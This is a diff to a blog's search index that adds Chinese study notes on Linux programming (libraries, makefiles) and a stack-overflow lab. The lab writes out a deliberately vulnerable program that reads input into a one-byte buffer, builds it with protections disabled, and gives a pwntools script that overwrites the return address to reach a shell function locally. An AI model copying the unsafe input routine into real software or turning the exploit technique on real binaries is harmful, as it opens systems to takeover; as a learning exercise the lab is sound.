@@ -2602,6 +2602,8 @@ ed-1=x*\phi(n)</script><p>如果我们已知p,q的位数，那就大概知道n�
 <li>内核的陷入处理程序将陷入错误类型转换成一个<strong>幻数</strong>（信号）</li>
 <li>将信号传递给进程，使进程终止 </li>
 </ol>
+<h2 id="3-EXT2-文件系统"><a href="#3-EXT2-文件系统" class="headerlink" title="3 EXT2 文件系统"></a>3 EXT2 文件系统</h2><p>EXT3：增加日志</p>
+<p>EXT4：主要变化是磁盘块的分配</p>
 ]]></content>
       <categories>
         <category>笔记</category>
@@ -2610,5 +2612,172 @@ ed-1=x*\phi(n)</script><p>如果我们已知p,q的位数，那就大概知道n�
         <tag>读书笔记</tag>
         <tag>Linux</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Linux程序设计</title>
+    <url>/2021/06/22/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
+    <content><![CDATA[<h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章 基础知识"></a>第一章 基础知识</h2><h3 id="1-1-Linux-程序设计常识"><a href="#1-1-Linux-程序设计常识" class="headerlink" title="1.1 Linux 程序设计常识"></a>1.1 Linux 程序设计常识</h3><ul>
+<li>GCC：GNU 编译器集，它包括 GNU C 编译器</li>
+<li>G++：C++ 编译器，是 GCC 的一部分</li>
+<li>C 语言编译器被简称为 cc</li>
+</ul>
+<h3 id="1-2-一些标准路径"><a href="#1-2-一些标准路径" class="headerlink" title="1.2 一些标准路径"></a>1.2 一些标准路径</h3><ul>
+<li><code>/bin</code>：二进制文件目录，用于存放启动系统时用到的程序</li>
+<li><code>/usr/bin</code>：用户二进制文件目录，用于存放用户使用的标准程序</li>
+<li><code>/usr/local/bin</code>：本地二进制文件目录，用于存放软件安装的程序</li>
+<li><code>/usr/sbin</code> 和 <code>/sbin</code>：系统管理员登陆后使用 PATH 变量可能还包含，系统管理程序的目录</li>
+<li><code>/opt</code>：可选的操作系统组件和第三方应用程序可能被安装在此</li>
+<li><code>lib</code> 和 <code>/usr/lib</code>：标准系统库文件</li>
+</ul>
+<p>关键位置：</p>
+<ul>
+<li>系统管理员一般喜欢使用 <code>/opt</code> 和 <code>/usr/local</code> 因为升级操作系统时只有这两个目录需要保留</li>
+<li>gcc 一般位于 <code>/usr/bin</code> 或 <code>/usr/local/bin</code> 或 <code>/usr/lib/gcc</code> 中</li>
+<li>C 语言头文件位于 <code>/usr/include</code> 及其子目录。哪些依赖 Linux 版本的头文件通常在 <code>/usr/include/sys</code> 和 <code>/usr/include/linux</code> 中</li>
+</ul>
+<h3 id="1-3-头文件与库文件之-gcc-使用"><a href="#1-3-头文件与库文件之-gcc-使用" class="headerlink" title="1.3 头文件与库文件之 gcc 使用"></a>1.3 头文件与库文件之 gcc 使用</h3><ul>
+<li><p><code>-I/目录</code>：包含非标准位置的头文件</p>
+</li>
+<li><p><code>-L/目录</code>： 添加非标准位置的库</p>
+</li>
+</ul>
+<hr>
+<p><strong>库文件名</strong>：libc 指 C语言库，libm 指数学库；后缀 <code>.a</code> 代表传统静态函数库，<code>.so</code> 代表共享函数库</p>
+<ul>
+<li>拓展<ul>
+<li><strong>静态库的缺点</strong>：如果同时运行很多程序都使用来自同意函数库的函数，内存中就会有同一函数的多份副本，造成资源浪费。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="1-4-静态库实验"><a href="#1-4-静态库实验" class="headerlink" title="1.4 静态库实验"></a>1.4 静态库实验</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fred.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fred</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fred: we passed %d\n&quot;</span>, arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bill.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bill</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bill: we passed %s\n&quot;</span>, arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>gcc -c bill.c fred.c</code> 只编译不链接，生成两个对应的 <code>.o</code> 文件</li>
+<li>为库文件创建一个头文件 lib.h</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lib.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bill</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fred</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>编写调用程序 program.c</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;lib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bill(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>编译调用程序并为编译器显示指定目标文件，并与编译好的 bill.o 链接</li>
+</ul>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">gcc -c program.c</span><br><span class="line">gcc -o program program.o bill.o</span><br><span class="line">./program </span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/22/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210622115212840.png" alt="image-20210622115212840"></p>
+<hr>
+<h4 id="1-4-1-将目标文件添加到归档文件（创建并使用一个库文件）"><a href="#1-4-1-将目标文件添加到归档文件（创建并使用一个库文件）" class="headerlink" title="1.4.1 将目标文件添加到归档文件（创建并使用一个库文件）"></a>1.4.1 将目标文件添加到归档文件（创建并使用一个库文件）</h4><ul>
+<li><p><code>ar crv libfoo.a bill.o fred.o</code></p>
+</li>
+<li><p>使用库文件</p>
+<ul>
+<li>方法一：在当前文件列表直接使用：<code>gcc -o program program.o libfoo.a</code></li>
+<li>方法二：使用 <code>-L</code> 访问函数库：<code>gcc -o program program.o -L. -lfoo</code><ul>
+<li><code>-L.</code> 表示在当前目录查找库函数；<code>-lfoo</code> 表示使用 libfoo.a 的函数库（或者 libfoo.so 如果存在的话）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="1-5-共享库"><a href="#1-5-共享库" class="headerlink" title="1.5 共享库"></a>1.5 共享库</h3><ul>
+<li><strong>与静态库的区别</strong>：程序本身不在包含库文件的代码，而是引用运行时可访问的共享代码。当编译好的程序被装载到内存中执行时，函数引用被解析成对共享库的调用。</li>
+<li><strong>共享库的优点</strong>：<ul>
+<li>系统只需要保留一个共享库副本</li>
+<li>共享库的更新可以独立于依赖它的程序</li>
+</ul>
+</li>
+</ul>
+<h4 id="1-5-1-如何配置使系统搜索额外的共享库位置"><a href="#1-5-1-如何配置使系统搜索额外的共享库位置" class="headerlink" title="1.5.1 如何配置使系统搜索额外的共享库位置"></a>1.5.1 如何配置使系统搜索额外的共享库位置</h4><ul>
+<li>修改 <code>/etc/ld.so.conf</code> 文件</li>
+<li>执行 <code>ldconfig</code> 生效</li>
+</ul>
+<h4 id="1-5-2-如何查看一个程序需要的共享库"><a href="#1-5-2-如何查看一个程序需要的共享库" class="headerlink" title="1.5.2 如何查看一个程序需要的共享库"></a>1.5.2 如何查看一个程序需要的共享库</h4><ul>
+<li><code>ldd 程序名</code>，比如</li>
+</ul>
+<p><img src="/2021/06/22/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210622164051603.png" alt="image-20210622164051603"></p>
+<h2 id="第九章-开发工具"><a href="#第九章-开发工具" class="headerlink" title="第九章 开发工具"></a>第九章 开发工具</h2><h3 id="9-1-make-与-makefile"><a href="#9-1-make-与-makefile" class="headerlink" title="9.1 make 与 makefile"></a>9.1 make 与 makefile</h3><ul>
+<li>作用：控制源代码的编译（make 命令会根据 makefile 文件确定目标文件的创建顺序以及正确的规则调用顺序）</li>
+</ul>
+<h4 id="9-1-1-make-命令的选项"><a href="#9-1-1-make-命令的选项" class="headerlink" title="9.1.1 make 命令的选项"></a>9.1.1 make 命令的选项</h4><ul>
+<li><code>-k</code>：遇到错误也继续执行</li>
+<li><code>-n</code>：输出将要执行的下一步操作</li>
+<li><code>-f &lt;filename&gt;</code>：告诉 make 将哪个文件作为 makefile<ul>
+<li>如果不存在这个选项，make 会先找名为 makefile 的文件，不存在就再找 Makefile</li>
+</ul>
+</li>
+</ul>
+<h4 id="9-1-2-依赖关系的写法"><a href="#9-1-2-依赖关系的写法" class="headerlink" title="9.1.2 依赖关系的写法"></a>9.1.2 依赖关系的写法</h4><p><code>目标名称: 依赖的文件列表</code></p>
+<ul>
+<li><p>举例：</p>
+<p>最终的程序 myapp 依赖 main.o 2.o 3.o；main.o 依赖 main.c a.h；2.o 依赖 2.c a.h b.h，3.o 依赖 3.c b.h c.h。</p>
+<p>所以 main.o 受 main.c 和 a.h 影响，这两个文件修改了都要重新编译 main.c 以重建 main.o</p>
+</li>
+</ul>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">myapp: main.o 2.o 3.o</span></span><br><span class="line"><span class="section">main.o: main.c a.h</span></span><br><span class="line"><span class="section">2.o: 2.c a.h b.h</span></span><br><span class="line"><span class="section">3.o: 3.c b.h c.h</span></span><br></pre></td></tr></table></figure>
+<h4 id="9-1-3-编写规则"><a href="#9-1-3-编写规则" class="headerlink" title="9.1.3 编写规则"></a>9.1.3 编写规则</h4><font face="楷体" color="red">注意：makefile 中空格和制表符是有区别的</font>
+
+<ul>
+<li>规则所在行必须以<strong>制表符</strong>开头</li>
+<li>makefile 中的行不能以空格结尾</li>
+</ul>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">myapp: main.o 2.o 3.o</span></span><br><span class="line">	gcc -o myapp main.o 2.o 3.o</span><br><span class="line"><span class="section">main.o: main.c a.h</span></span><br><span class="line">	gcc -c main.c</span><br><span class="line"><span class="section">2.o: 2.c a.h b.h</span></span><br><span class="line">	gcc -c 2.c</span><br><span class="line"><span class="section">3.o: 3.c b.h c.h</span></span><br><span class="line">	gcc -c 3.c</span><br></pre></td></tr></table></figure>
+<h4 id="9-1-4-makefile-中的宏"><a href="#9-1-4-makefile-中的宏" class="headerlink" title="9.1.4 makefile 中的宏"></a>9.1.4 makefile 中的宏</h4><p>makefile 文件中的宏通常被用于设置编译器的选项、头文件目录等</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">all: myapp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Which compiler</span></span><br><span class="line">CC = gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where are include files kept</span></span><br><span class="line">INCLUDE = .</span><br><span class="line"></span><br><span class="line"><span class="section">myapp: main.o 2.o 3.o</span></span><br><span class="line">	<span class="variable">$(CC)</span> -o myapp main.o 2.o 3.o</span><br><span class="line">	</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h4 id="9-1-5-makefile-中的特殊字符"><a href="#9-1-5-makefile-中的特殊字符" class="headerlink" title="9.1.5 makefile 中的特殊字符"></a>9.1.5 makefile 中的特殊字符</h4><ul>
+<li><code>-</code>：告诉 make 命令忽略所有错误</li>
+<li><code>@</code>：告诉 make 在执行某条命令之前不要将该命令显示在标准输出上</li>
+</ul>
+<h2 id="第十一章-进程和信号"><a href="#第十一章-进程和信号" class="headerlink" title="第十一章 进程和信号"></a>第十一章 进程和信号</h2>]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>读书笔记</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈溢出实验</title>
+    <url>/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/</url>
+    <content><![CDATA[<p><code>gets</code> 参考 CSAPP P195<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">gets</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">char</span>* dest = s;</span><br><span class="line">    <span class="keyword">while</span> ((c = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF) &#123;</span><br><span class="line">        *dest++ = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c == EOF &amp;&amp; dest == s)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    *dest++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line">    <span class="built_in">gets</span>(&amp;v1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>修改 version2</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">gets</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">char</span>* dest = s;</span><br><span class="line">    <span class="keyword">while</span> ((c = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF) &#123;</span><br><span class="line">        *dest++ = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c == EOF &amp;&amp; dest == s)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    *dest++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>*  <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vuln</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>关闭保护</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -fno-stack-protector -z execstack -no-pie stack.cpp -o stack</span><br></pre></td></tr></table></figure>
+<ul>
+<li>得到可执行文件 stack，拿到 IDA 64 反编译</li>
+</ul>
+<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210623235648172.png" alt="image-20210623235648172"></p>
+<ul>
+<li><code>checksec --file=stack</code> 结果如下</li>
+</ul>
+<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210623235709636.png" alt="image-20210623235709636"></p>
+<ul>
+<li>vuln 函数如下</li>
+</ul>
+<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210624000730044.png" alt="image-20210624000730044"></p>
+<ul>
+<li>栈信息如下，因此需要覆盖 9 个字符到达返回地址</li>
+</ul>
+<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210624000706356.png" alt="image-20210624000706356"></p>
+<ul>
+<li>shell 地址 0x4006F4；shell 的 retn 地址 0x400705（因为本地环境是 Ubuntu 18，所以要做堆栈平衡需要知道 retn 地址）</li>
+</ul>
+<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210623235917096.png" alt="image-20210623235917096"></p>
+<ul>
+<li>exp.py 代码如下</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">shell = <span class="number">0x4006F4</span></span><br><span class="line">retn = <span class="number">0x400705</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">9</span> + p64(retn) + p64(shell)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>python exp.py</code>，可以打通本地，结果如下</li>
+</ul>
+<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210624000416446.png" alt="image-20210624000416446"></p>
+]]></content>
   </entry>
 </search>
